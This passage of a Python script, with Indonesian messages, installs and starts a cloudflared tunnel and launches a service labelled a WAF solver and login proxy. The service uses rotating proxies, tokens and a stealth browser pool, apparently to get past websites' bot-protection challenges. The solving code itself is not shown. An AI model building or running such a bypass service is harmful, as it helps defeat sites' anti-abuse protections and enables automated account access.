            url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-{arch}.tgz"
            dest_dir = os.path.join(os.path.expanduser('~'), '.local', 'bin')
            dest = os.path.join(dest_dir, 'cloudflared')
        else:
            url = f"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{arch}"
            dest_dir = os.path.join(os.path.expanduser('~'), '.local', 'bin')
            dest = os.path.join(dest_dir, 'cloudflared')
        os.makedirs(dest_dir, exist_ok=True)
        print(f"  *  Downloading cloudflared dari {url} ...", flush=True)
        try:
            if os_name == 'darwin':
                tgz_path = os.path.join(dest_dir, 'cloudflared.tgz')
                _dl_ok = False
                for dl_cmd in [['curl','-fSL','-o',tgz_path,url],['wget','-q','-O',tgz_path,url]]:
                    try:
                        dl = subprocess.run(dl_cmd, capture_output=True, text=True, timeout=120)
                        if dl.returncode == 0:
                            _dl_ok = True
                            break
                    except FileNotFoundError:
                        continue
                if not _dl_ok:
                    print(f"  \033[91m* Download gagal\033[0m", flush=True)
                    return
                import tarfile
                with tarfile.open(tgz_path, 'r:gz') as tf:
                    tf.extract('cloudflared', dest_dir)
                os.remove(tgz_path)
                os.chmod(dest, 0o755)
            else:
                # Robust download: urllib with certifi + curl/wget fallback.
                _dl_ok = False
                try:
                    import urllib.request, ssl
                    ctx_ssl = ssl.create_default_context()
                    try:
                        import certifi
                        ctx_ssl = ssl.create_default_context(cafile=certifi.where())
                    except Exception:
                        pass
                    req = urllib.request.Request(url, headers={"User-Agent": "cloudflared-installer/1.0"})
                    with urllib.request.urlopen(req, timeout=120, context=ctx_ssl) as resp:
                        with open(dest, 'wb') as fh:
                            shutil.copyfileobj(resp, fh)
                    _dl_ok = os.path.getsize(dest) > 1000
                except Exception as e:
                    print(f"  \033[93m* urllib download failed: {e}, trying curl/wget...\033[0m", flush=True)
                if not _dl_ok:
                    for dl_cmd in [['curl','-fSL','-o',dest,url],['wget','-q','-O',dest,url]]:
                        try:
                            dl = subprocess.run(dl_cmd, capture_output=True, text=True, timeout=120)
                            if dl.returncode == 0 and os.path.exists(dest) and os.path.getsize(dest) > 1000:
                                _dl_ok = True
                                break
                        except FileNotFoundError:
                            continue
                if not _dl_ok:
                    print(f"  \033[91m* Download gagal\033[0m", flush=True)
                    return
                if os_name != 'win32':
                    os.chmod(dest, 0o755)
            cf_bin = dest
            if dest_dir not in os.environ.get('PATH', ''):
                os.environ['PATH'] = dest_dir + os.pathsep + os.environ.get('PATH', '')
            print(f"  \033[92m* cloudflared terinstall: {dest}\033[0m", flush=True)
        except Exception as e:
            print(f"  \033[91m* Install cloudflared gagal: {e}\033[0m", flush=True)
            return

    cmd = [cf_bin, 'tunnel', '--url', f'http://localhost:{port}']
    print(f"  \033[96m* Menjalankan: {' '.join(cmd)}\033[0m", flush=True)
    popen_kwargs = dict(stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        encoding='utf-8', errors='replace')
    if os_name == 'win32':
        popen_kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW
    try:
        _cf_process = subprocess.Popen(cmd, **popen_kwargs)
    except Exception as e:
        print(f"  \033[91m* Gagal start cloudflared: {e}\033[0m", flush=True)
        return
    _tunnel_found = threading.Event()
    def _read_stream(stream, label):
        try:
            for line in iter(stream.readline, ''):
                line = line.strip()
                if not line:
                    continue
                m = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
                if m and not _tunnel_found.is_set():
                    _tunnel_found.set()
                    tunnel_url = m.group(1)
                    print(f"\n  \033[92m{'='*52}\033[0m", flush=True)
                    print(f"  \033[92m* CLOUDFLARE TUNNEL AKTIF\033[0m", flush=True)
                    print(f"  \033[92m   {tunnel_url}\033[0m", flush=True)
                    print(f"  \033[92m{'='*52}\033[0m\n", flush=True)
        except Exception as e:
            print(f"  \033[93m* cloudflared {label} reader error: {e}\033[0m", flush=True)
    for stream, label in [(_cf_process.stdout, 'stdout'), (_cf_process.stderr, 'stderr')]:
        t = threading.Thread(target=_read_stream, args=(stream, label), daemon=True)
        t.start()
    print("  \033[96m* Menunggu tunnel URL (max 20s)...\033[0m", flush=True)
    if not _tunnel_found.wait(timeout=20):
        print("  \033[93m* Tunnel URL belum muncul dalam 20s\033[0m", flush=True)
    def _kill_cf():
        if _cf_process and _cf_process.poll() is None:
            print("\n  \033[93m*  Menutup cloudflared tunnel...\033[0m", flush=True)
            _cf_process.terminate()
            try:
                _cf_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                _cf_process.kill()
    _atexit.register(_kill_cf)

# Legacy stubs — the browser-backed path never emits COMPUTE.
_cache_lock = threading.Lock()
_HARNESS_CHECKED = False

def _extract_compute(html, sess, tmp, ua):
    """Legacy stub — the browser-backed fetch path never triggers COMPUTE."""
    return False

def _run_harness_v2(tmp, ua, lang="en-US,en;q=0.9", tag=""):
    """Legacy stub — the browser-backed fetch path never triggers COMPUTE."""
    return None, "harness_disabled (browser-backed fetch is in use)"

if __name__ == '__main__':
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument('--port', type=int, default=5555)
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--proxies', default='proxies.txt')
    ap.add_argument('--tokens', default=None)
    ap.add_argument('--no-tunnel', action='store_true')
    ap.add_argument('--warm-pages', type=int, default=None)
    ap.add_argument('--solve-timeout', type=int, default=None)
    args = ap.parse_args()
    PORT = args.port
    os.environ['WAF_PORT'] = str(PORT)

    if args.warm_pages is not None:
        WARM_SIZE = max(1, int(args.warm_pages))
        os.environ['WAF_WARM_PAGES'] = str(WARM_SIZE)
    if args.solve_timeout is not None:
        WAF_FETCH_TIMEOUT_S = max(5, int(args.solve_timeout))
        os.environ['WAF_SOLVE_TIMEOUT'] = str(WAF_FETCH_TIMEOUT_S)

    script_dir = os.path.dirname(os.path.abspath(__file__))
    if args.tokens:
        TOKEN_FILE = os.path.abspath(args.tokens)
    else:
        TOKEN_FILE = os.path.join(script_dir, 'tokens.txt')
    print(f"\n  \033[96mWAF SOLVER — browser-backed warm-pool + login proxy\033[0m")
    print(f"  \033[96mCycle: auto-reload every {CYCLE_EVERY} solves, 3-fail streak\033[0m")
    print(f"  \033[96mWarm pool: {WARM_SIZE} pages | solve timeout: {WAF_FETCH_TIMEOUT_S}s\033[0m")
    proxy_path = args.proxies
    if not os.path.isabs(proxy_path):
        proxy_path = os.path.join(script_dir, proxy_path)
    if os.path.exists(proxy_path):
        _load_proxies(proxy_path)
    else:
        print(f"  \033[93m* No proxy file at '{proxy_path}' * running direct\033[0m", flush=True)
    print(f"  Single:  http://localhost:{args.port}/")
    print(f"  Multi:   http://localhost:{args.port}/multi?n=4")
    print(f"  Monitor: http://localhost:{args.port}/monitor?key={MONITOR_KEY}")
    print(f"  Tokens:  {TOKEN_FILE}")
    print(f"  Proxies: {len(PROXIES)} loaded")
    print(f"  Cycle:   auto reload every {CYCLE_EVERY} solves (env WAF_CYCLE_EVERY)")
    print(f"  Streak:  auto reload after 3 consecutive fails\n")

    if _HAS_BROWSER:
        try:
            loop = _ensure_waf_loop()
            asyncio.run_coroutine_threadsafe(_init_warm_pool(), loop)
            print(f"  \033[96m* Priming warm pool ({WARM_SIZE} pages)...\033[0m", flush=True)
        except Exception as e:
            print(f"  \033[93m* Warm-pool prime failed: {e}\033[0m", flush=True)
    else:
        print(f"  \033[91m* cloakbrowser missing — /api/waf and /api/login will 502 until installed\033[0m")

    if not args.no_tunnel:
        _setup_cloudflared(args.port)

    app.run(host=args.host, port=args.port, debug=False, threaded=True)